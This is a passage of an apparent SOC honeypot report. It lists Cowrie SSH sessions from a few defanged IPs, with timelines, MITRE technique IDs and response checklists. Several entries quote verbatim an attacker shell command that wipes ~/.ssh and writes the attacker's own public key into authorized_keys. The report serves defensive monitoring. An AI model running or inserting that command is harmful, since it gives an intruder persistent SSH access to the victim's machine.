| **First Seen** | 2026-06-04 10:17 |
| **Last Seen** | 2026-06-04 10:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:17:02` | `cowrie.session.connect` |
| `2026-06-04 10:17:02` | `cowrie.client.version` |
| `2026-06-04 10:17:03` | `cowrie.client.kex` |
| `2026-06-04 10:17:04` | `cowrie.login.success` |
| `2026-06-04 10:17:05` | `cowrie.session.params` |
| `2026-06-04 10:17:05` | `cowrie.command.input` |
| `2026-06-04 10:17:05` | `cowrie.command.failed` |
| `2026-06-04 10:17:05` | `cowrie.log.closed` |
| `2026-06-04 10:17:06` | `cowrie.session.params` |
| `2026-06-04 10:17:06` | `cowrie.command.input` |
| `2026-06-04 10:17:06` | `cowrie.session.file_download` |
| `2026-06-04 10:17:06` | `cowrie.log.closed` |
| `2026-06-04 10:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a87fd0f7db

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:17 |
| **Last Seen** | 2026-06-04 10:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:17:10` | `cowrie.session.connect` |
| `2026-06-04 10:17:10` | `cowrie.client.version` |
| `2026-06-04 10:17:10` | `cowrie.client.kex` |
| `2026-06-04 10:17:12` | `cowrie.login.success` |
| `2026-06-04 10:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f873cf1e0a59

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]84` |
| **First Seen** | 2026-06-04 10:18 |
| **Last Seen** | 2026-06-04 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:18:17` | `cowrie.session.connect` |
| `2026-06-04 10:18:17` | `cowrie.client.version` |
| `2026-06-04 10:18:17` | `cowrie.client.kex` |
| `2026-06-04 10:18:18` | `cowrie.login.success` |
| `2026-06-04 10:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ecf762c788

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:19 |
| **Last Seen** | 2026-06-04 10:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:19:33` | `cowrie.session.connect` |
| `2026-06-04 10:19:33` | `cowrie.client.version` |
| `2026-06-04 10:19:34` | `cowrie.client.kex` |
| `2026-06-04 10:19:34` | `cowrie.login.success` |
| `2026-06-04 10:19:34` | `cowrie.session.params` |
| `2026-06-04 10:19:34` | `cowrie.command.input` |
| `2026-06-04 10:19:34` | `cowrie.command.failed` |
| `2026-06-04 10:19:34` | `cowrie.log.closed` |
| `2026-06-04 10:19:34` | `cowrie.session.params` |
| `2026-06-04 10:19:34` | `cowrie.command.input` |
| `2026-06-04 10:19:34` | `cowrie.session.file_download` |
| `2026-06-04 10:19:34` | `cowrie.log.closed` |
| `2026-06-04 10:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f865b35c691b

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:19 |
| **Last Seen** | 2026-06-04 10:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:19:36` | `cowrie.session.connect` |
| `2026-06-04 10:19:36` | `cowrie.client.version` |
| `2026-06-04 10:19:36` | `cowrie.client.kex` |
| `2026-06-04 10:19:37` | `cowrie.login.success` |
| `2026-06-04 10:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb64b5a4a3e

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:19 |
| **Last Seen** | 2026-06-04 10:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:19:49` | `cowrie.session.connect` |
| `2026-06-04 10:19:49` | `cowrie.client.version` |
| `2026-06-04 10:19:50` | `cowrie.client.kex` |
| `2026-06-04 10:19:51` | `cowrie.login.success` |
| `2026-06-04 10:19:52` | `cowrie.session.params` |
| `2026-06-04 10:19:52` | `cowrie.command.input` |
| `2026-06-04 10:19:52` | `cowrie.command.failed` |
| `2026-06-04 10:19:52` | `cowrie.log.closed` |
| `2026-06-04 10:19:53` | `cowrie.session.params` |
| `2026-06-04 10:19:53` | `cowrie.command.input` |
| `2026-06-04 10:19:53` | `cowrie.session.file_download` |
| `2026-06-04 10:19:53` | `cowrie.log.closed` |
| `2026-06-04 10:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf990022e59d

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:19 |
| **Last Seen** | 2026-06-04 10:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:19:57` | `cowrie.session.connect` |
| `2026-06-04 10:19:57` | `cowrie.client.version` |
| `2026-06-04 10:19:57` | `cowrie.client.kex` |
| `2026-06-04 10:19:59` | `cowrie.login.success` |
| `2026-06-04 10:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49683e1aadf8

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:21 |
| **Last Seen** | 2026-06-04 10:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:21:45` | `cowrie.session.connect` |
| `2026-06-04 10:21:45` | `cowrie.client.version` |
| `2026-06-04 10:21:45` | `cowrie.client.kex` |
| `2026-06-04 10:21:45` | `cowrie.login.success` |
| `2026-06-04 10:21:45` | `cowrie.session.params` |
| `2026-06-04 10:21:45` | `cowrie.command.input` |
| `2026-06-04 10:21:45` | `cowrie.command.failed` |
| `2026-06-04 10:21:46` | `cowrie.log.closed` |
| `2026-06-04 10:21:46` | `cowrie.session.params` |
| `2026-06-04 10:21:46` | `cowrie.command.input` |
| `2026-06-04 10:21:46` | `cowrie.session.file_download` |
| `2026-06-04 10:21:46` | `cowrie.log.closed` |
| `2026-06-04 10:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7487cd19ad

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:21 |
| **Last Seen** | 2026-06-04 10:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:21:48` | `cowrie.session.connect` |
| `2026-06-04 10:21:48` | `cowrie.client.version` |
| `2026-06-04 10:21:48` | `cowrie.client.kex` |
| `2026-06-04 10:21:48` | `cowrie.login.success` |
| `2026-06-04 10:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6b954c91c5

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:22 |
| **Last Seen** | 2026-06-04 10:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:22:24` | `cowrie.session.connect` |
| `2026-06-04 10:22:24` | `cowrie.client.version` |
| `2026-06-04 10:22:24` | `cowrie.client.kex` |
| `2026-06-04 10:22:25` | `cowrie.login.success` |
| `2026-06-04 10:22:26` | `cowrie.session.params` |
| `2026-06-04 10:22:26` | `cowrie.command.input` |
| `2026-06-04 10:22:26` | `cowrie.command.failed` |
| `2026-06-04 10:22:26` | `cowrie.log.closed` |
| `2026-06-04 10:22:27` | `cowrie.session.params` |
| `2026-06-04 10:22:27` | `cowrie.command.input` |
| `2026-06-04 10:22:27` | `cowrie.session.file_download` |
| `2026-06-04 10:22:27` | `cowrie.log.closed` |
| `2026-06-04 10:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81de0f64f663

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:22 |
| **Last Seen** | 2026-06-04 10:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:22:31` | `cowrie.session.connect` |
| `2026-06-04 10:22:31` | `cowrie.client.version` |
| `2026-06-04 10:22:31` | `cowrie.client.kex` |
| `2026-06-04 10:22:33` | `cowrie.login.success` |
| `2026-06-04 10:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40b9cf6dad34

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:24 |
| **Last Seen** | 2026-06-04 10:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:24:00` | `cowrie.session.connect` |
| `2026-06-04 10:24:00` | `cowrie.client.version` |
| `2026-06-04 10:24:00` | `cowrie.client.kex` |
| `2026-06-04 10:24:01` | `cowrie.login.success` |
| `2026-06-04 10:24:01` | `cowrie.session.params` |
| `2026-06-04 10:24:01` | `cowrie.command.input` |
| `2026-06-04 10:24:01` | `cowrie.command.failed` |
| `2026-06-04 10:24:01` | `cowrie.log.closed` |
| `2026-06-04 10:24:01` | `cowrie.session.params` |
| `2026-06-04 10:24:01` | `cowrie.command.input` |
| `2026-06-04 10:24:01` | `cowrie.session.file_download` |
| `2026-06-04 10:24:01` | `cowrie.log.closed` |
| `2026-06-04 10:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a23b58a433

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:24 |
| **Last Seen** | 2026-06-04 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:24:03` | `cowrie.session.connect` |
| `2026-06-04 10:24:03` | `cowrie.client.version` |
| `2026-06-04 10:24:03` | `cowrie.client.kex` |
| `2026-06-04 10:24:03` | `cowrie.login.success` |
| `2026-06-04 10:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80bf0a6b6a4d

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:30 |
| **Last Seen** | 2026-06-04 10:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:30:00` | `cowrie.session.connect` |
| `2026-06-04 10:30:00` | `cowrie.client.version` |
| `2026-06-04 10:30:00` | `cowrie.client.kex` |
| `2026-06-04 10:30:02` | `cowrie.login.success` |
| `2026-06-04 10:30:03` | `cowrie.session.params` |
| `2026-06-04 10:30:03` | `cowrie.command.input` |
| `2026-06-04 10:30:03` | `cowrie.command.failed` |
| `2026-06-04 10:30:03` | `cowrie.log.closed` |
| `2026-06-04 10:30:04` | `cowrie.session.params` |
| `2026-06-04 10:30:04` | `cowrie.command.input` |
| `2026-06-04 10:30:04` | `cowrie.session.file_download` |
| `2026-06-04 10:30:04` | `cowrie.log.closed` |
| `2026-06-04 10:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90c9e25d11d

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:30 |
| **Last Seen** | 2026-06-04 10:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:30:08` | `cowrie.session.connect` |
| `2026-06-04 10:30:08` | `cowrie.client.version` |
| `2026-06-04 10:30:08` | `cowrie.client.kex` |
| `2026-06-04 10:30:10` | `cowrie.login.success` |
| `2026-06-04 10:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34cb25d23b8a

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:32 |
| **Last Seen** | 2026-06-04 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:32:42` | `cowrie.session.connect` |
| `2026-06-04 10:32:42` | `cowrie.client.version` |
| `2026-06-04 10:32:42` | `cowrie.client.kex` |
| `2026-06-04 10:32:44` | `cowrie.login.success` |
| `2026-06-04 10:32:45` | `cowrie.session.params` |
| `2026-06-04 10:32:45` | `cowrie.command.input` |
| `2026-06-04 10:32:45` | `cowrie.command.failed` |
| `2026-06-04 10:32:45` | `cowrie.log.closed` |
| `2026-06-04 10:32:46` | `cowrie.session.params` |
| `2026-06-04 10:32:46` | `cowrie.command.input` |
| `2026-06-04 10:32:46` | `cowrie.session.file_download` |
| `2026-06-04 10:32:46` | `cowrie.log.closed` |
| `2026-06-04 10:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a437ae7cd8c3

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:32 |
| **Last Seen** | 2026-06-04 10:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:32:50` | `cowrie.session.connect` |
| `2026-06-04 10:32:50` | `cowrie.client.version` |
| `2026-06-04 10:32:50` | `cowrie.client.kex` |
| `2026-06-04 10:32:52` | `cowrie.login.success` |
| `2026-06-04 10:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e97252af8c

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:35 |
| **Last Seen** | 2026-06-04 10:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
